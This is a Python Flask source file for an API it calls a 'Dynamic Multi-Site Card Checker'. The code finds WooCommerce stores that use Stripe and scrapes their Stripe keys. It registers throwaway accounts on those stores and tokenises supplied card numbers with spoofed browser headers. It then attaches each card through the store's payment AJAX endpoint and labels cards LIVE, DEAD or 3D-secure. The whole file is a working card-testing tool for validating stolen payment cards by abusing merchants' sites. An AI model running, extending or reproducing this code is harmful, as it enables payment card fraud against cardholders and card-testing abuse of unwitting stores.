from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import random
import string
import logging
import re
from datetime import datetime
import time
from urllib.parse import urlparse, urljoin
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)
CORS(app)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)

STRIPE_GUID = '9296a736-8562-4d4f-a33b-1a436f4e812fbf2218'
STRIPE_MUID = '80adf712-fa93-441a-8b77-0d64c2589d350eedce'
STRIPE_SID = 'ed7085a5-8b79-41b8-9f7a-428975ab23a27dffa6'

# Job tracking
job_progress = {}
job_lock = threading.Lock()
executor = ThreadPoolExecutor(max_workers=10)


def update_job_progress(job_id, step_name, status, message):
    """Thread-safe progress update"""
    with job_lock:
        if job_id not in job_progress:
            job_progress[job_id] = {
                'steps': [],
                'status': 'processing',
                'result': None,
                'start_time': time.time()
            }
        
        job_progress[job_id]['steps'].append({
            'name': step_name,
            'status': status,
            'message': message,
            'timestamp': time.time()
        })


def get_job_status(job_id):
    """Get current job status"""
    with job_lock:
        return job_progress.get(job_id, None)


def complete_job(job_id, result):
    """Mark job as complete"""
    with job_lock:
        if job_id in job_progress:
            job_progress[job_id]['status'] = 'completed'
            job_progress[job_id]['result'] = result
            job_progress[job_id]['end_time'] = time.time()


class SiteDetector:
    """Auto-detect site type and extract Stripe configuration."""
    
    def __init__(self, site_url):
        self.site_url = site_url if site_url.startswith('http') else f'https://{site_url}'
        self.site_url = self.site_url.rstrip('/')
        self.domain = urlparse(self.site_url).netloc
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
        })
        
    def detect_wordpress(self):
        """Detect if site is WordPress - Ultra fast detection."""
        try:
            response = self.session.get(self.site_url, timeout=10)
            text_lower = response.text.lower()
            indicators = [
                '/wp-content/' in response.text,
                '/wp-includes/' in response.text,
                'wordpress' in text_lower,
                'wp-json' in text_lower
            ]
            if any(indicators):
                return True
            return False
        except:
            return False
    
    def detect_woocommerce(self):
        """Detect if site uses WooCommerce - Ultra fast detection."""
        try:
            response = self.session.get(self.site_url, timeout=10)
            html = response.text.lower()
            return 'woocommerce' in html or 'wc-ajax' in html
        except:
            return False
    
    def find_payment_pages(self):
        """Find payment-related pages."""
        pages = []
        paths = [
            '/my-account/',
            '/checkout/',
            '/cart/',
            '/my-account/payment-methods/',
            '/my-account/add-payment-method/'
        ]
        
        for path in paths:
            try:
                url = urljoin(self.site_url, path)
                r = self.session.get(url, timeout=30)
                if r.status_code == 200:
                    pages.append(url)
            except:
                pass
        
        return pages
    
    def extract_stripe_key(self):
        """Extract Stripe publishable key from site - Ultra fast."""
        urls_to_check = [self.site_url, urljoin(self.site_url, '/my-account/'), urljoin(self.site_url, '/checkout/')]
        
        for url in urls_to_check:
            try:
                response = self.session.get(url, timeout=10)
                
                pk_match = re.search(r'(pk_(?:live|test)_[a-zA-Z0-9]{24,107})', response.text)
                if pk_match:
                    return pk_match.group(1)
                        
            except:
                continue
        
        return None
    
    def get_account_page(self):
        """Get my-account page URL."""
        paths = ['/my-account/', '/my-account', '/account/', '/customer/account/']
        
        for path in paths:
            try:
                url = urljoin(self.site_url, path)
                r = self.session.get(url, timeout=30)
                if r.status_code == 200:
                    return url
            except:
                pass
        
        return urljoin(self.site_url, '/my-account/')


def generate_random_credentials():
    """Generate random email and password for registration."""
    timestamp = int(time.time())
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"user{timestamp}{random_string}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    username = f"user{timestamp}{random_string}"
    return email, password, username


def register_account_dynamic(site_url):
    """Register a new account on any WordPress/WooCommerce site - Fast version."""
    session = requests.Session()
    email, password, username = generate_random_credentials()
    
    detector = SiteDetector(site_url)
    
    # Try alternative account page paths
    account_paths = [
        '/my-account/',
        '/my-account-2/',
        '/account/',
        '/customer/account/'
    ]
    
    account_url = None
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    }
    
    # Find working account page
    for path in account_paths:
        try:
            test_url = urljoin(site_url if site_url.startswith('http') else f'https://{site_url}', path)
            test_resp = session.get(test_url, headers=headers, timeout=8)
            if test_resp.status_code == 200 and ('register' in test_resp.text.lower() or 'sign up' in test_resp.text.lower()):
                account_url = test_url
                logging.info(f"✓ Found account page: {path}")
                break
        except:
            continue
    
    if not account_url:
        account_url = detector.get_account_page()
    
    try:
        response = session.get(account_url, headers=headers, timeout=12)
        
        nonce = None
        nonce_patterns = [
            r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
            r'name="_wpnonce"\s+value="([^"]+)"',
            r'name="register-nonce"\s+value="([^"]+)"'
        ]
        
        for pattern in nonce_patterns:
            match = re.search(pattern, response.text)
            if match:
                nonce = match.group(1)
                logging.info(f"Found nonce: {nonce[:10]}...")
                break
        
        referer_match = re.search(r'name="_wp_http_referer"\s+value="([^"]+)"', response.text)
        referer = referer_match.group(1) if referer_match else '/my-account/'
        
    except Exception as e:
        return False, None, None, f"Page fetch error: {e}"
    
    try:
        reg_data = {
            'username': username,
            'email': email,
            'password': password,
        }
        
        if nonce:
            reg_data['woocommerce-register-nonce'] = nonce
            reg_data['_wpnonce'] = nonce
        
        reg_data['_wp_http_referer'] = referer
        reg_data['register'] = 'Register'
        
        parsed_url = urlparse(account_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        reg_headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': base_url,
            'Referer': account_url,
        }
        
        response = session.post(account_url, data=reg_data, headers=reg_headers, timeout=15, allow_redirects=True)
        
        cookies_dict = session.cookies.get_dict()
        has_login_cookie = any('wordpress_logged_in' in key for key in cookies_dict.keys())
        
        success_indicators = [
            has_login_cookie,
            'logout' in response.text.lower(),
            'dashboard' in response.url.lower(),
            'my-account' in response.url.lower() and 'register' not in response.url.lower(),
            'welcome' in response.text.lower() and len(response.text) > 1000
        ]
        
        if any(success_indicators):
            try:
                payment_urls = [
                    urljoin(base_url, '/my-account/add-payment-method/'),
                    urljoin(base_url, '/my-account/payment-methods/'),
                    urljoin(base_url, '/checkout/')
                ]
                
                ajax_nonce = None
                for payment_url in payment_urls:
                    try:
                        payment_page = session.get(payment_url, headers=headers, timeout=10)
                        
                        nonce_patterns = [
                            r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]{10})"',
                            r'"nonce"\s*:\s*"([a-f0-9]{10})"',
                            r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"'
                        ]
                        
                        for pattern in nonce_patterns:
                            match = re.search(pattern, payment_page.text)
                            if match:
                                ajax_nonce = match.group(1)
                                break
                        
                        if ajax_nonce:
                            break
                    except:
                        continue
                
                final_nonce = ajax_nonce if ajax_nonce else '0746bbffaa'
                logging.info(f"Registration successful! Nonce: {final_nonce}")
                return True, session, final_nonce, "Registration successful"
            except Exception as e:
                return True, session, '0746bbffaa', "Registration successful (using default nonce)"
        else:
            return False, None, None, f"Registration failed - HTTP {response.status_code}"
            
    except Exception as e:
        return False, None, None, f"Registration error: {e}"


def get_stripe_payment_token(card_info: str, stripe_key: str):
    """Get Stripe payment token using auto-detected key."""
    try:
        card_number, exp_month, exp_year, cvc = card_info.replace(" ", "").split('|')
        exp_year = exp_year[-2:]
    except ValueError:
        return 'DEAD', "Invalid card format"

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = (
        f'type=card&card[number]={card_number}&card[cvc]={cvc}&card[exp_year]={exp_year}&card[exp_month]={exp_month}'
        '&allow_redisplay=unspecified'
        '&billing_details[address][country]=US'
        '&payment_user_agent=stripe.js%2F2a60804053%3B+stripe-js-v3%2F2a60804053%3B+payment-element%3B+deferred-intent'
        '&time_on_page=33763'
        f'&guid={STRIPE_GUID}&muid={STRIPE_MUID}&sid={STRIPE_SID}'
        f'&key={stripe_key}'
        '&_stripe_version=2024-06-20'
    )

    try:
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=10)
        response_data = response.json()
        
        if response.status_code == 200 and 'id' in response_data:
            return 'SUCCESS', response_data['id']
        else:
            error_message = response_data.get('error', {}).get('message', 'Unknown Stripe error')
            return 'DEAD', f"Stripe Token Error: {error_message}"

    except requests.exceptions.RequestException as e:
        return 'DEAD', f"Request Error: {e}"


def add_card_to_website_dynamic(payment_method_id: str, session, ajax_nonce, site_url, retry_count=0):
    """Add card to any WordPress/WooCommerce site and check if LIVE or DEAD."""
    parsed_url = urlparse(site_url if site_url.startswith('http') else f'https://{site_url}')
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    # Try multiple payment page paths
    payment_paths = [
        '/my-account/add-payment-method/',
        '/my-account-2/add-payment-method/',
        '/my-account/payment-methods/add/',
        '/checkout/'
    ]
    
    ajax_action = 'wc_stripe_create_and_confirm_setup_intent'
    legacy_actions = [
        'wc_stripe_create_setup_intent',
        'wc_stripe_create_payment_method',
        'wc_stripe_add_payment_method'
    ]
    
    page_text = ""
    payment_url = urljoin(base_url, payment_paths[0])
    
    # Find working payment page
    for path in payment_paths:
        try:
            test_url = urljoin(base_url, path)
            headers = {
                'authority': parsed_url.netloc,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
                'referer': urljoin(base_url, '/my-account/'),
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            payment_page = session.get(test_url, headers=headers, timeout=15)
            if payment_page.status_code == 200 and ('stripe' in payment_page.text.lower() or 'payment' in payment_page.text.lower()):
                page_text = payment_page.text
                payment_url = test_url
                logging.info(f"✓ Found payment page: {path}")
                break
        except:
            continue
    
    if not page_text:
        # Fallback to default
        try:
            headers = {
                'authority': parsed_url.netloc,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            payment_page = session.get(urljoin(base_url, '/my-account/add-payment-method/'), timeout=20)
            page_text = payment_page.text
        except:
            pass
    
    headers = {
        'authority': parsed_url.netloc,
        'accept': '*/*',
        'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': base_url,
        'referer': payment_url,
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    try:
        
        # Try multiple nonce extraction patterns
        nonce_patterns = [
            (r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]{10})"', 'wc_stripe_create_and_confirm_setup_intent'),
            (r'"add_card_nonce"\s*:\s*"([a-f0-9]{10})"', 'wc_stripe_create_setup_intent'),
            (r'"createSetupIntentNonce"\s*:\s*"([a-f0-9]{10})"', 'wc_stripe_create_setup_intent'),
            (r'"createPaymentMethodNonce"\s*:\s*"([a-f0-9]{10})"', 'wc_stripe_create_payment_method'),
            (r'"nonce"\s*:\s*"([a-f0-9]{10})"', 'wc_stripe_create_and_confirm_setup_intent'),
        ]
        
        for pattern, action in nonce_patterns:
            nonce_match = re.search(pattern, page_text)
            if nonce_match:
                ajax_nonce = nonce_match.group(1)
                ajax_action = action
                logging.info(f"✓ Found nonce: {ajax_nonce[:6]}... for action: {ajax_action}")
                break
        
        # Try from wc_stripe_params if not found yet
        if not ajax_nonce:
            wc_params_match = re.search(r'var\s+wc_stripe_params\s*=\s*(\{[^;]+\});', page_text)
            if wc_params_match:
                try:
                    params_str = wc_params_match.group(1)
                    for pattern, action in nonce_patterns:
                        nonce_match = re.search(pattern, params_str)
                        if nonce_match:
                            ajax_nonce = nonce_match.group(1)
                            ajax_action = action
                            logging.info(f"✓ Extracted from params: {ajax_nonce[:6]}...")
                            break
                except:
                    pass
    except:
        logging.warning(f"⚠ Using default nonce")
        pass
    
    data = {
        'action': ajax_action,
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    
    # Add extra parameters based on action type
    if ajax_action == 'wc_stripe_create_and_confirm_setup_intent':
        data['is_woopay_preflight_check'] = '0'
        data['payment_method'] = payment_method_id
    elif ajax_action == 'wc_stripe_create_setup_intent':
        data['stripe_source_id'] = payment_method_id
        data['nonce'] = ajax_nonce
    
    logging.info(f"Using action: {ajax_action}")

    try:
        response = session.post(
            urljoin(base_url, '/wp-admin/admin-ajax.php'),
            headers=headers, data=data, timeout=25
        )
        response_text = response.text
        
        logging.info(f"Card check response: HTTP {response.status_code}")
        logging.info(f"Response preview: {response_text[:200]}")

        if response.status_code in [429, 503] and retry_count < 2:
            time.sleep(random.uniform(8, 12))
            return add_card_to_website_dynamic(payment_method_id, session, ajax_nonce, site_url, retry_count + 1)

        if response.status_code == 200:
            response_lower = response_text.lower()
            
            # Parse JSON response first
            try:
                json_response = response.json()
                if json_response.get('success') == True:
                    data = json_response.get('data', {})
                    status = data.get('status', '')
                    
                    # Check Stripe setup intent status
                    if status == 'succeeded':
                        logging.info("✅ LIVE - Card Added Successfully!")
                        return 'LIVE', "Card Added Successfully ✓"
                    
                    if status == 'requires_action' or status == 'requires_source_action':
                        logging.info("🔒 3D SECURE - Card Valid, needs authentication")
                        return '3D_REQUIRED', "Card Valid - 3D Secure Required ✓"
                    
                    if status == 'requires_payment_method':
                        logging.info("❌ DEAD - Card Declined")
                        return 'DEAD', "Card Declined by Bank"
            except:
                pass
            
            # Fallback text-based detection
            if '"success":true' in response_text and '"status":"succeeded"' in response_text:
                logging.info("✅ LIVE - Card successfully added!")
                return 'LIVE', "Card Added Successfully ✓"
            
            if 'succeeded' in response_lower and 'setup_intent' in response_lower:
                logging.info("✅ LIVE - Setup Intent Succeeded!")
                return 'LIVE', "Card Verified ✓"
            
            # 3D SECURE / CVV CASES
            if 'requires_action' in response_lower or 'authentication_required' in response_lower or 'does not support this type of purchase' in response_lower:
                logging.info("🔒 Card needs 3D Secure")
                return '3D_REQUIRED', "Card Valid - 3D Secure Required ✓"
            
            # RATE LIMIT
            if 'cannot add a new payment method so soon' in response_lower or 'try again later' in response_lower:
                logging.warning("⏳ Rate Limited")
                return 'RATE_LIMIT', "Too many requests - Try later"
            
            # PARSE JSON ERRORS
            try:
                error_data = response.json()
                
                # Check success field
                if error_data.get('success') == False:
                    error_info = error_data.get('data', {})
                    error_msg = error_info.get('error', {}).get('message', '')
                    error_code = error_info.get('error', {}).get('code', '')
                    
                    logging.info(f"❌ Error Code: {error_code}, Message: {error_msg}")
                    
                    # Specific error codes
                    if 'insufficient_funds' in error_code or 'insufficient' in error_msg.lower():
                        return 'LIVE', "Insufficient Funds - Card Valid ✓"
                    
                    if 'card_declined' in error_code or 'declined' in error_msg.lower():
                        return 'DEAD', f"Card Declined: {error_msg}"
                    
                    if 'incorrect_cvc' in error_code or 'incorrect cvc' in error_msg.lower():
                        return 'DEAD', "Incorrect CVC"
                    
                    if 'expired' in error_code or 'expired' in error_msg.lower():
                        return 'DEAD', "Card Expired"
                    
                    if 'invalid' in error_code or 'invalid' in error_msg.lower():
                        return 'DEAD', f"Invalid: {error_msg}"
                    
                    # Generic decline
                    if error_msg:
                        return 'DEAD', f"Declined: {error_msg}"
                
            except json.JSONDecodeError:
                pass
            
            # TEXT-BASED ERROR DETECTION
            if 'decline' in response_lower or 'declined' in response_lower:
                logging.info("❌ Card Declined (text match)")
                return 'DEAD', "Card Declined by Bank"
            
            if 'invalid' in response_lower:
                return 'DEAD', "Invalid Card"
            
            if 'expired' in response_lower:
                return 'DEAD', "Card Expired"
            
            # Unknown but not success
            logging.warning(f"⚠ Unknown response: {response_text[:150]}")
            return 'DEAD', "Check Failed - Unknown Response"
        
        # NON-200 STATUS CODES
        if response.status_code == 400:
            logging.info(f"Card check response: HTTP 400")
            logging.info(f"Response preview: {response_text[:200]}")
            try:
                error_data = response.json()
                error_msg = error_data.get('data', {}).get('error', {}).get('message', '')
                if not error_msg:
                    error_msg = error_data.get('message', 'Bad Request')
                
                if 'nonce' in error_msg.lower() or 'invalid' in error_msg.lower():
                    logging.warning("⚠️ Nonce/validation error - retrying with fresh nonce")
                    return 'DEAD', f"Site Security Error: {error_msg}"
                
                return 'DEAD', f"Site Error: {error_msg}"
            except:
                if response_text and len(response_text) > 0:
                    if response_text.strip() == '0' or response_text.strip() == '-1':
                        if retry_count == 0:
                            logging.warning(f"⚠️ Got '{response_text.strip()}' response - trying all actions")
                            
                            # Try all possible actions systematically
                            all_actions = [ajax_action] + legacy_actions
                            all_actions = list(dict.fromkeys(all_actions))  # Remove duplicates while preserving order
                            
                            for try_action in all_actions:
                                if try_action == ajax_action:
                                    continue  # Skip the one we just tried
                                    
                                logging.info(f"Attempting: {try_action}")
                                retry_data = {
                                    'action': try_action,
                                    'wc-stripe-payment-method': payment_method_id,
                                    'wc-stripe-payment-type': 'card',
                                    '_ajax_nonce': ajax_nonce,
                                }
                                
                                # Add action-specific parameters
                                if try_action == 'wc_stripe_create_and_confirm_setup_intent':
                                    retry_data['is_woopay_preflight_check'] = '0'
                                    retry_data['payment_method'] = payment_method_id
                                elif try_action == 'wc_stripe_create_setup_intent':
                                    retry_data['stripe_source_id'] = payment_method_id
                                    retry_data['nonce'] = ajax_nonce
                                
                                try:
                                    retry_response = session.post(
                                        urljoin(base_url, '/wp-admin/admin-ajax.php'),
                                        headers=headers, data=retry_data, timeout=25
                                    )
                                    if retry_response.text.strip() not in ['0', '-1', '']:
                                        logging.info(f"✓ Action {try_action} worked! Response: {retry_response.text[:100]}")
                                        # Parse this successful response
                                        try:
                                            json_resp = retry_response.json()
                                            if json_resp.get('success') == True:
                                                return 'LIVE', "Card Added Successfully ✓"
                                            else:
                                                error_msg = json_resp.get('data', {}).get('error', {}).get('message', 'Unknown error')
                                                if 'insufficient' in error_msg.lower():
                                                    return 'LIVE', "Insufficient Funds - Card Valid ✓"
                                                return 'DEAD', error_msg
                                        except:
                                            if 'success' in retry_response.text.lower() and 'true' in retry_response.text.lower():
                                                return 'LIVE', "Card Added Successfully ✓"
                                            pass
                                except Exception as retry_err:
                                    logging.warning(f"⚠️ Action {try_action} failed: {retry_err}")
                                    continue
                        
                        return 'DEAD', "Site Configuration Error - Payment Gateway Not Properly Setup"
                    return 'DEAD', f"Bad Request - Response: {response_text[:50]}"
                return 'DEAD', "Bad Request - Site Error"
        
        return 'DEAD', f"HTTP {response.status_code}"

    except requests.exceptions.Timeout:
        logging.error("⏱ Timeout")
        return 'DEAD', "Request Timeout"
    except requests.exceptions.RequestException as e:
        logging.error(f"🔴 Request Error: {e}")
        return 'DEAD', f"Error: {str(e)[:50]}"


@app.route('/key-<api_key>/site=<path:site>/check', methods=['GET'])
def check_card_with_key(api_key, site):
    """API endpoint to check card on any site with API key."""
    
    if api_key != '@teamlegendno1':
        return jsonify({
            'status': 'error',
            'message': 'Invalid API key'
        }), 401
    
    cc = request.args.get('cc', '')
    
    if not cc:
        return jsonify({
            'status': 'error',
            'message': 'CC parameter required. Format: /key-@teamlegendno1/site=example.com/check?cc=4111111111111111|12|2025|123'
        }), 400
    
    start_time = time.time()
    steps = []
    
    try:
        card_parts = cc.split('|')
        card_display = f"{card_parts[0][:4]}...{card_parts[0][-4:]}"
    except:
        card_display = "****"
    
    steps.append({
        'step': 1,
        'name': 'Site Detection',
        'status': 'processing',
        'message': f'Detecting site: {site}'
    })
    
    detector = SiteDetector(site)
    is_wp = detector.detect_wordpress()
    is_wc = detector.detect_woocommerce()
    
    if not is_wp or not is_wc:
        steps[-1]['status'] = 'failed'
        steps[-1]['message'] = f'Not a WordPress/WooCommerce site'
        return jsonify({
            'status': 'DEAD',
            'site': site,
            'card': card_display,
            'reason': 'Site is not WordPress/WooCommerce compatible',
            'steps': steps,
            'time_taken': round(time.time() - start_time, 2)
        })
    
    steps[-1]['status'] = 'success'
    steps[-1]['message'] = f'WordPress/WooCommerce detected ✓'
    
    steps.append({
        'step': 2,
        'name': 'Stripe Key Extraction',
        'status': 'processing',
        'message': 'Extracting Stripe public key...'
    })
    
    stripe_key = detector.extract_stripe_key()
    
    if not stripe_key:
        steps[-1]['status'] = 'failed'
        steps[-1]['message'] = 'No Stripe key found on site'
        return jsonify({
            'status': 'DEAD',
            'site': site,
            'card': card_display,
            'reason': 'Stripe integration not found on this site',
            'steps': steps,
            'time_taken': round(time.time() - start_time, 2)
        })
    
    steps[-1]['status'] = 'success'
    steps[-1]['message'] = f'Stripe key found: {stripe_key[:15]}...'
    
    steps.append({
        'step': 3,
        'name': 'Account Registration',
        'status': 'processing',
        'message': 'Registering new account...'
    })
    
    reg_success, session, ajax_nonce, reg_msg = register_account_dynamic(site)
    
    if not reg_success:
        steps[-1]['status'] = 'failed'
        steps[-1]['message'] = f'Registration failed: {reg_msg}'
        return jsonify({
            'status': 'DEAD',
            'site': site,
            'card': card_display,
            'reason': f'Registration failed: {reg_msg}',
            'steps': steps,
            'time_taken': round(time.time() - start_time, 2)
        })
    
    steps[-1]['status'] = 'success'
    steps[-1]['message'] = 'Account created successfully'
    
    steps.append({
        'step': 4,
        'name': 'Stripe Token',
        'status': 'processing',
        'message': 'Getting Stripe payment token...'
    })
    
    token_status, token_or_msg = get_stripe_payment_token(cc, stripe_key)
    
    if token_status == 'DEAD':
        steps[-1]['status'] = 'failed'
        steps[-1]['message'] = token_or_msg
        return jsonify({
            'status': 'DEAD',
            'site': site,
            'card': card_display,
            'reason': token_or_msg,
            'steps': steps,
            'time_taken': round(time.time() - start_time, 2)
        })
    
    pm_token = token_or_msg
    steps[-1]['status'] = 'success'
    steps[-1]['message'] = f'Token received: {pm_token[:20]}...'
    
    steps.append({
        'step': 5,
        'name': 'Payment Method',
        'status': 'processing',
        'message': 'Adding payment method to account...'
    })
    
    website_status, website_msg = add_card_to_website_dynamic(pm_token, session, ajax_nonce, site)
    
    steps[-1]['status'] = 'success' if website_status in ['LIVE', '3D_REQUIRED'] else ('warning' if website_status == 'RATE_LIMIT' else 'failed')
    steps[-1]['message'] = website_msg
    
    response_data = {
        'status': website_status,
        'site': site,
        'card': card_display,
        'full_card': cc,
        'stripe_key': stripe_key,
        'message': website_msg,
        'steps': steps,
        'time_taken': round(time.time() - start_time, 2)
    }
    
    if website_status == 'LIVE':
        response_data['response'] = '✅ LIVE - Card successfully added!'
    elif website_status == '3D_REQUIRED':
        response_data['response'] = '🔒 3D SECURE - Card valid but needs verification'
    elif website_status == 'RATE_LIMIT':
        response_data['response'] = f'⏳ RATE LIMITED - {website_msg}'
    else:
        response_data['response'] = f'❌ DEAD - {website_msg}'
    
    return jsonify(response_data)


def background_check_card(job_id, api_key, site, cc):
    """Background worker for checking card with real-time progress updates"""
    try:
        start_time = time.time()
        
        # Step 1: Site Detection
        update_job_progress(job_id, 'Site Detection', 'processing', f'Detecting site: {site}')
        
        detector = SiteDetector(site)
        is_wp = detector.detect_wordpress()
        is_wc = detector.detect_woocommerce()
        
        if not is_wp or not is_wc:
            update_job_progress(job_id, 'Site Detection', 'failed', 'Not a WordPress/WooCommerce site')
            complete_job(job_id, {
                'status': 'DEAD',
                'message': 'Site is not WordPress/WooCommerce compatible',
                'time_taken': round(time.time() - start_time, 2)
            })
            return
        
        update_job_progress(job_id, 'Site Detection', 'success', 'WordPress/WooCommerce detected ✓')
        
        # Step 2: Stripe Key Extraction
        update_job_progress(job_id, 'Stripe Key Extraction', 'processing', 'Extracting Stripe public key...')
        
        stripe_key = detector.extract_stripe_key()
        
        if not stripe_key:
            update_job_progress(job_id, 'Stripe Key Extraction', 'failed', 'No Stripe key found on site')
            complete_job(job_id, {
                'status': 'DEAD',
                'message': 'Stripe integration not found on this site',
                'time_taken': round(time.time() - start_time, 2)
            })
            return
        
        update_job_progress(job_id, 'Stripe Key Extraction', 'success', f'Stripe key found: {stripe_key[:15]}...')
        
        # Step 3: Account Registration
        update_job_progress(job_id, 'Account Registration', 'processing', 'Registering new account...')
        
        reg_success, session, ajax_nonce, reg_msg = register_account_dynamic(site)
        
        if not reg_success:
            update_job_progress(job_id, 'Account Registration', 'failed', f'Registration failed: {reg_msg}')
            complete_job(job_id, {
                'status': 'DEAD',
                'message': f'Account registration failed: {reg_msg}',
                'time_taken': round(time.time() - start_time, 2)
            })
            return
        
        update_job_progress(job_id, 'Account Registration', 'success', 'Account created successfully')
        
        # Step 4: Stripe Token
        update_job_progress(job_id, 'Stripe Token', 'processing', 'Generating Stripe payment token...')
        
        pm_status, pm_token = get_stripe_payment_token(cc, stripe_key)
        
        if pm_status != 'SUCCESS':
            update_job_progress(job_id, 'Stripe Token', 'failed', pm_token)
            complete_job(job_id, {
                'status': 'DEAD',
                'message': pm_token,
                'time_taken': round(time.time() - start_time, 2)
            })
            return
        
        update_job_progress(job_id, 'Stripe Token', 'success', f'Token received: {pm_token[:20]}...')
        
        # Step 5: Payment Method
        update_job_progress(job_id, 'Payment Method', 'processing', 'Adding payment method to account...')
        
        website_status, website_msg = add_card_to_website_dynamic(pm_token, session, ajax_nonce, site)
        
        status_type = 'success' if website_status in ['LIVE', '3D_REQUIRED'] else ('warning' if website_status == 'RATE_LIMIT' else 'failed')
        update_job_progress(job_id, 'Payment Method', status_type, website_msg)
        
        # Complete job
        complete_job(job_id, {
            'status': website_status,
            'site': site,
            'stripe_key': stripe_key,
            'message': website_msg,
            'time_taken': round(time.time() - start_time, 2)
        })
        
    except Exception as e:
        logging.error(f"Background job {job_id} failed: {e}")
        update_job_progress(job_id, 'Error', 'failed', str(e))
        complete_job(job_id, {
            'status': 'DEAD',
            'message': f'Error: {str(e)}',
            'time_taken': 0
        })


@app.route('/key-<api_key>/site=<path:site>/check/start', methods=['GET'])
def start_check_card(api_key, site):
    """Start async card check and return job ID"""
    if api_key != '@teamlegendno1':
        return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401
    
    cc = request.args.get('cc', '')
    if not cc:
        return jsonify({'status': 'error', 'message': 'CC parameter required'}), 400
    
    # Generate job ID
    job_id = str(uuid.uuid4())
    
    # Start background job
    executor.submit(background_check_card, job_id, api_key, site, cc)
    
    return jsonify({
        'status': 'started',
        'job_id': job_id,
        'message': 'Card check started in background'
    })


@app.route('/check/status/<job_id>', methods=['GET'])
def get_check_status(job_id):
    """Get real-time status of card check"""
    job_data = get_job_status(job_id)
    
    if not job_data:
        return jsonify({'status': 'error', 'message': 'Job not found'}), 404
    
    return jsonify({
        'job_id': job_id,
        'status': job_data['status'],
        'steps': job_data['steps'],
        'result': job_data.get('result'),
        'elapsed_time': round(time.time() - job_data['start_time'], 2)
    })


@app.route('/', methods=['GET'])
def home():
    """API documentation."""
    return jsonify({
        'name': 'Dynamic Multi-Site Card Checker API',
        'version': '3.0',
        'description': 'Works with ANY WordPress/WooCommerce site automatically - No site list needed!',
        'how_it_works': 'Simply provide any WooCommerce site domain and card details. The API will automatically detect WordPress/WooCommerce, extract Stripe keys, register an account, and check your card in ~1 minute.',
        'endpoints': {
            '/key-API_KEY/site=DOMAIN/check': {
                'method': 'GET',
                'description': 'Check a credit card on ANY WordPress/WooCommerce site with Stripe',
                'parameters': {
                    'API_KEY': 'Your API key (e.g., @teamlegendno1)',
                    'DOMAIN': 'ANY domain with WooCommerce + Stripe (e.g., yoursite.com)',
                    'cc': 'Card details in format: card_number|exp_month|exp_year|cvc'
                },
                'example': '/key-@teamlegendno1/site=anystore.com/check?cc=4111111111111111|12|2025|123'
            }
        },
        'features': [
            '✅ Works with ANY WordPress/WooCommerce site',
            '✅ Auto-detects site configuration',
            '✅ Extracts Stripe public key automatically',
            '✅ Creates account dynamically',
            '✅ Auto extracts nonces and tokens',
            '✅ Fast checking (~1 minute)',
            '✅ No manual configuration needed'
        ],
        'response_codes': {
            'LIVE': 'Card successfully added',
            '3D_REQUIRED': 'Card valid but requires 3D Secure',
            'DEAD': 'Card declined or invalid',
            'RATE_LIMIT': 'Too many requests'
        },
        'requirements': 'Target site must have WordPress + WooCommerce + Stripe Payment Gateway installed'
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
